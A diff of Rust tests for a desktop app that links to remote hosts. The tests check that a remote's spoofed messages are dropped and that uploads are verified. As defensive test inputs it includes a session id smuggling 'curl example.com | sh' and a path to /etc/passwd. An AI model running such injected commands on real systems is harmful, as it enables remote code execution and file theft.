@@ -2,7 +2,7 @@ use super::*;
 use crate::{Hive, Term};
 
 use futures_util::{SinkExt, StreamExt};
-use hive_protocol::{Frame, FrameCodec};
+use hive_protocol::{Frame, FrameCodec, FrameType};
 use tauri::ipc::InvokeResponseBody;
 use tokio::sync::mpsc;
 use tokio_util::codec::{FramedRead, FramedWrite};
@@ -295,13 +295,24 @@ impl Drop for Lab {
 /// Runs `script`'s remote command as sshd would, with `/bin/sh` as the login shell, in the
 /// lab's `home`, with `stdin`.
 fn remote(lab: &Lab, script: Script, home: &str, stdin: &[u8]) -> std::process::Output {
+    remote_on(lab, script, home, stdin, &lab.remote_path())
+}
+
+/// [`remote`] with `path` as the remote's `PATH`.
+fn remote_on(
+    lab: &Lab,
+    script: Script,
+    home: &str,
+    stdin: &[u8],
+    path: &str,
+) -> std::process::Output {
     use std::io::Write as _;
     let mut child = std::process::Command::new("/bin/sh")
         .arg("-c")
         .arg(command(script))
         .env_clear()
         .env("HOME", lab.path(home))
-        .env("PATH", lab.remote_path())
+        .env("PATH", path)
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
@@ -378,6 +389,10 @@ fn an_upload_is_checked_before_it_runs_and_renamed_only_once_it_runs() {
         upload(&upload_input(&other)),
         "the uploaded hive does not run",
     );
+    // A folder others can read is made the user's own first.
+    use std::os::unix::fs::PermissionsExt;
+    let open = std::fs::Permissions::from_mode(0o755);
+    std::fs::set_permissions(lab.path("home/.hive/bin"), open).unwrap();
     let out = upload(&input);
     assert!(out.status.success(), "{out:?}");
     assert_eq!(std::fs::read(&hive).unwrap(), build);
@@ -385,6 +400,29 @@ fn an_upload_is_checked_before_it_runs_and_renamed_only_once_it_runs() {
     assert_eq!(mode(&lab.path("home/.hive/bin")), 0o700);
     // Without the header line nothing is written.
     assert_eq!(upload(b"").status.code(), Some(1));
+}
+
+#[test]
+fn a_host_without_sha256sum_cannot_be_installed_on() {
+    let lab = Lab::new("no-sha256sum");
+    // The tools the upload needs, and no `sha256sum`.
+    let tools = lab.path("tools");
+    std::fs::create_dir_all(&tools).unwrap();
+    for tool in ["mkdir", "chmod", "rm", "cat", "wc", "mv"] {
+        let dirs = ["/bin", "/usr/bin"].map(std::path::Path::new);
+        let found = dirs.iter().map(|dir| dir.join(tool)).find(|p| p.exists());
+        std::os::unix::fs::symlink(found.unwrap(), tools.join(tool)).unwrap();
+    }
+    let path = format!("{}:{}", lab.path("bin").display(), tools.display());
+    let build = std::fs::read(lab.path("builds/hive-linux-x86_64")).unwrap();
+    let out = remote_on(&lab, Script::Upload, "home", &upload_input(&build), &path);
+    assert_eq!(out.status.code(), Some(4));
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    let why = "hive-upload: the uploaded checksum does not match\n";
+    assert!(stderr.ends_with(why), "{stderr}");
+    assert!(!lab.path("home/.hive/bin/hive.new").exists());
+    assert!(!lab.path("home/.hive/bin/hive").exists());
+    assert!(!lab.path("ran").exists());
 }
 
 /// A UI channel and what it received.
@@ -558,10 +596,9 @@ async fn a_new_host_gets_this_app_s_hive_then_links_with_its_keep_time_and_app_i
         seen[1],
         json!({"type": "host_link", "host": "gpu", "state": "installing", "cpu": "x86_64"})
     );
-    // The service's messages reach the UI with the host.
-    let welcome = rx.recv().await.unwrap();
-    assert_eq!(welcome["type"], "welcome");
-    assert_eq!(welcome["host"], "gpu");
+    // Its `welcome` is the link's, not the UI's (26.18 tells hosts apart).
+    let quiet = tokio::time::timeout(Duration::from_millis(300), rx.recv()).await;
+    assert!(quiet.is_err(), "{quiet:?}");
     // A check, the upload, then the check that runs the bridge.
     let runs = lab.runs();
     let commands: Vec<_> = runs.iter().map(|run| run.last().unwrap().clone()).collect();
@@ -1094,35 +1131,74 @@ async fn the_local_settings_link_the_hosts_and_requests_go_to_each_host_s_link()
     let opened = next_of(&mut rx, "terminal_opened").await;
     assert_eq!(opened["channel"], 2);
     assert_eq!(opened["host"], "gpu");
-    assert_eq!(bytes.recv().await.unwrap(), b"$ ");
+    let shown = tokio::time::timeout(WAIT, bytes.recv()).await.unwrap();
+    assert_eq!(shown.unwrap(), b"$ ");
     hive.attach_terminal(2, output().0).unwrap();
     assert_eq!(
         remote.control().await,
         (2, Control::Ack { bytes: u32::MAX })
     );
-    hive.close_terminal(2).unwrap();
-    assert_eq!(remote.control().await, (2, Control::CloseTerminal));
-    // A remote's path never opens here; its files get no `hive-file:` URL.
-    let target = json!({"type": "editor_target", "worktree": "/r", "path": "a", "windows_path": "/etc/passwd", "reveal": false});
-    remote.writer.send(raw(&target)).await.unwrap();
-    let media = json!({"token": "t", "version": "1", "mime": "image/png"});
-    let file = json!({"type": "file", "worktree": "/r", "path": "a.png", "media": media});
-    remote.writer.send(raw(&file)).await.unwrap();
-    let target = next_of(&mut rx, "editor_target").await;
-    assert_eq!(target["host"], "gpu");
+    // Until the UI tells hosts apart (26.18), it gets none of a remote's messages it would take
+    // for the local service's: none on channel 0 (the app's own types among them), and on a
+    // terminal's channel, no agent's or notification. A path a remote names never opens here,
+    // and its files (with a `media.url` it wrote) never reach the UI.
+    let session = json!([{"id": "x; curl example.com | sh; #", "cwd": "/w", "config_dir": null}]);
+    let media =
+        json!({"token": "t", "version": "1", "mime": "text/html", "url": "http://localhost:1420/"});
+    let dropped = [
+        json!({"type": "restore_sessions", "sessions": session}),
+        json!({"type": "files_dropped", "text": "x", "x": 1, "y": 1}),
+        json!({"type": "menu", "item": "settings"}),
+        json!({"type": "quit_requested"}),
+        json!({"type": "uninstalled", "failed": []}),
+        json!({"type": "notification_clicked", "agent": "a"}),
+        json!({"type": "tray_clicked", "agent": "a"}),
+        json!({"type": "settings", "settings": {"remote": {"hosts": ["evil"]}}}),
+        json!({"type": "welcome", "version": "9", "distro": null, "warning": null}),
+        json!({"type": "projects", "projects": []}),
+        json!({"type": "error", "message": "spoofed"}),
+        json!({"type": "editor_target", "worktree": "/r", "path": "a", "windows_path": "/etc/passwd", "reveal": false}),
+        json!({"type": "file", "worktree": "/r", "path": "a.html", "media": media}),
+    ];
+    for message in &dropped {
+        remote.writer.send(raw(message)).await.unwrap();
+    }
+    let on_terminal = |message: Value| Frame {
+        kind: FrameType::Control,
+        channel: 2,
+        payload: message.to_string().into_bytes().into(),
+    };
+    let agent = json!({"type": "agent_state", "id": "a", "state": "working"});
+    let notification = json!({"type": "terminal_notification", "title": "t", "body": "b"});
+    for message in [agent, notification] {
+        remote.writer.send(on_terminal(message)).await.unwrap();
+    }
+    // One of its own terminal's does reach it, with the host: the first the UI gets.
+    let badge = json!({"type": "badge", "text": "ok"});
+    remote.writer.send(on_terminal(badge)).await.unwrap();
+    let got = tokio::time::timeout(WAIT, rx.recv())
+        .await
+        .unwrap()
+        .unwrap();
+    assert_eq!(
+        got,
+        json!({"type": "badge", "text": "ok", "channel": 2, "host": "gpu"})
+    );
     let unasked = "Hive opens only a path the service sent: /etc/passwd";
     assert_eq!(
         hive.open_path("/etc/passwd".into(), false),
         Err(unasked.into())
     );
     let gpu = hive.on(Some("gpu")).unwrap().link;
-    assert!(lock(&gpu).approved.is_empty());
-    let file = next_of(&mut rx, "file").await;
-    assert_eq!(file["media"], media);
+    assert!(lock(&gpu).approved.is_empty() && lock(&gpu).at_risk.is_empty());
+    // The remote's `settings` started no link to `evil`.
+    assert!(hive.on(Some("evil")).is_err());
+    hive.close_terminal(2).unwrap();
+    assert_eq!(remote.control().await, (2, Control::CloseTerminal));
     // Reconnect, restart and wake reach the host's link.
     let other = hive.reconnect_host("other");
     assert_eq!(other, Err("no link to the host other".into()));
-    hive.woke();
+    assert!(hive.woke());
     // While linked, none of them does anything.
     hive.restart_remote("gpu").unwrap();
     hive.reconnect_host("gpu").unwrap();
@@ -1137,39 +1213,33 @@ async fn the_local_settings_link_the_hosts_and_requests_go_to_each_host_s_link()
         (kept["channel"].as_u64(), kept["host"].as_str()),
         (Some(2), Some("gpu"))
     );
-    // It asks the remote's service for what the UI shows again.
-    for asked in [Control::GetSettings, Control::ListProjects, Control::Resync] {
-        assert_eq!(remote.control().await, (0, asked));
-    }
-    // A reloaded UI gets each host's state and welcome again.
+    // A reloaded UI gets each host's state again, but nothing of a remote's service (26.18
+    // tells hosts apart): no `welcome`, and nothing is asked of it (its next message below is
+    // the close).
     let (channel, mut reloaded) = ui();
     hive.connect(channel);
     // Its old terminals close, the remote's too.
     assert_eq!(local.control().await, (1, Control::CloseTerminal));
     assert_eq!(remote.control().await, (2, Control::CloseTerminal));
-    let mut seen = Vec::new();
-    while !seen
-        .iter()
-        .any(|m: &Value| m["type"] == "welcome" && m["host"] == "gpu")
-    {
-        seen.push(
-            tokio::time::timeout(WAIT, reloaded.recv())
-                .await
-                .unwrap()
-                .unwrap(),
-        );
-    }
-    let connected = |m: &Value| m["type"] == "host_link" && m["state"] == "connected";
-    assert!(seen.iter().any(connected), "{seen:?}");
+    let seen = until(&mut reloaded, "connected").await;
+    assert_eq!(seen.last().unwrap()["host"], "gpu");
+    assert!(
+        seen.iter()
+            .all(|m| m["type"] != "welcome" || m["host"].is_null()),
+        "{seen:?}"
+    );
     // The same host in new settings keeps its link; the keep time counts from its next link.
     let link = hive.on(Some("gpu")).unwrap().link;
     let mut settings = hive_protocol::Settings::default();
     settings.remote = self::settings(&["gpu"], 7);
     local.send(0, Control::Settings { settings }).await;
     let remotes = hive.remotes().unwrap();
-    while remotes.keep_secs.load(SeqCst) != 7 * 60 {
-        tokio::time::sleep(Duration::from_millis(10)).await;
-    }
+    let kept = async {
+        while remotes.keep_secs.load(SeqCst) != 7 * 60 {
+            tokio::time::sleep(Duration::from_millis(10)).await;
+        }
+    };
+    tokio::time::timeout(WAIT, kept).await.unwrap();
     assert!(Arc::ptr_eq(&hive.on(Some("gpu")).unwrap().link, &link));
     assert_eq!(lab.runs().len(), 1);
     // A host taken out of the settings ends its link.
@@ -1214,6 +1284,6 @@ async fn a_new_terminal_skips_the_channels_its_link_already_uses() {
     let none = Err("this app links to no remote host".to_owned());
     assert_eq!(hive.reconnect_host("gpu"), none);
     assert_eq!(hive.restart_remote("gpu"), none);
-    hive.woke();
+    assert!(!hive.woke());
     remotes.end();
 }
